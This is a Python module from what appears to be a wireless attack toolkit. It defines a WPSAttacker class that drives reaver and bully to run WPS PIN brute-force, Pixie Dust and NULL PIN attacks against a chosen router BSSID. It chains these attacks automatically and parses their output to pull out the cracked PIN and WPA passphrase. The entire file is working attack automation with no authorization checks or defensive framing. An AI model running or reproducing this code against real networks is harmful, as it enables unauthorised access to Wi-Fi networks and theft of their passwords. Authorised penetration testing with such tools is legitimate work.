"""
WPS Attack Module
=================
PIN brute-force, Pixie Dust, and NULL PIN attacks.
"""

import os
import time
import subprocess
from typing import Optional, Dict, Any
from dataclasses import dataclass

from bhisma.tools.binder import ToolBinder
from rich.console import Console

console = Console()


@dataclass
class WPSResult:
    success: bool = False
    pin: Optional[str] = None
    password: Optional[str] = None
    method: str = ""
    duration_sec: float = 0.0
    attempts: int = 0


class WPSAttacker:
    """Manages WPS PIN attacks."""

    def __init__(self, iface: str):
        self.iface = iface
        self.binder = ToolBinder()

    def brute_force(
        self,
        target_bssid: str,
        start_pin: Optional[str] = None,
        timeout: int = 600,
    ) -> WPSResult:
        """Sequential WPS PIN brute-force using reaver."""
        console.print(f"[bold cyan][*] WPS Brute-force: {target_bssid}[/bold cyan]")
        start = time.time()
        args = ["-i", self.iface, "-b", target_bssid, "-vv"]
        if start_pin:
            args += ["-p", start_pin]
        result = self.binder.execute("reaver", args, timeout=timeout)
        duration = time.time() - start
        return self._parse_reaver_output(result.stdout, duration, "brute_force")

    def pixie_dust(
        self,
        target_bssid: str,
        timeout: int = 120,
    ) -> WPSResult:
        """Pixie Dust attack — recover PIN from M1/M3 nonces."""
        console.print(f"[bold cyan][*] Pixie Dust: {target_bssid}[/bold cyan]")
        start = time.time()
        result = self.binder.execute(
            "reaver",
            ["-i", self.iface, "-b", target_bssid, "-K", "1", "-vv"],
            timeout=timeout,
        )
        duration = time.time() - start
        return self._parse_reaver_output(result.stdout, duration, "pixie_dust")

    def bully_attack(
        self,
        target_bssid: str,
        timeout: int = 600,
    ) -> WPSResult:
        """Alternative WPS attack using bully."""
        console.print(f"[bold cyan][*] Bully WPS: {target_bssid}[/bold cyan]")
        start = time.time()
        result = self.binder.execute(
            "bully",
            ["-b", target_bssid, self.iface, "-v", "3"],
            timeout=timeout,
        )
        duration = time.time() - start
        return self._parse_bully_output(result.stdout, duration)

    def null_pin(self, target_bssid: str) -> WPSResult:
        """Attempt NULL PIN (some routers accept blank PIN)."""
        console.print(f"[bold cyan][*] NULL PIN attempt: {target_bssid}[/bold cyan]")
        result = self.binder.execute(
            "reaver",
            ["-i", self.iface, "-b", target_bssid, "-p", "", "-vv"],
            timeout=60,
        )
        return self._parse_reaver_output(result.stdout, 0, "null_pin")

    def auto_attack(
        self,
        target_bssid: str,
        timeout: int = 600,
    ) -> WPSResult:
        """Automatically try best WPS attack sequence."""
        console.print(f"[bold cyan][*] Auto WPS attack on {target_bssid}[/bold cyan]")

        # 1. Try Pixie Dust first (fastest)
        result = self.pixie_dust(target_bssid, timeout=min(120, timeout))
        if result.success:
            return result

        # 2. Try NULL PIN
        result = self.null_pin(target_bssid)
        if result.success:
            return result

        # 3. Bully brute-force
        result = self.bully_attack(target_bssid, timeout=timeout)
        if result.success:
            return result

        # 4. Reaver brute-force as last resort
        return self.brute_force(target_bssid, timeout=timeout)

    def _parse_reaver_output(self, stdout: str, duration: float, method: str) -> WPSResult:
        """Parse reaver stdout for success indicators."""
        result = WPSResult(duration_sec=duration, method=method)
        if "WPS PIN" in stdout and "'" in stdout:
            import re
            pin_match = re.search(r"WPS PIN:\s*'([^']+)'", stdout)
            pwd_match = re.search(r"WPA PSK:\s*'([^']+)'", stdout)
            if pin_match:
                result.success = True
                result.pin = pin_match.group(1)
            if pwd_match:
                result.password = pwd_match.group(1)
        result.attempts = stdout.count("Trying pin")
        return result

    def _parse_bully_output(self, stdout: str, duration: float) -> WPSResult:
        """Parse bully stdout for success indicators."""
        result = WPSResult(duration_sec=duration, method="bully")
        if "[+] Pin" in stdout:
            import re
            pin_match = re.search(r"Pin\s*'([^']+)'", stdout)
            if pin_match:
                result.success = True
                result.pin = pin_match.group(1)
        result.attempts = stdout.count("[+]")
        return result
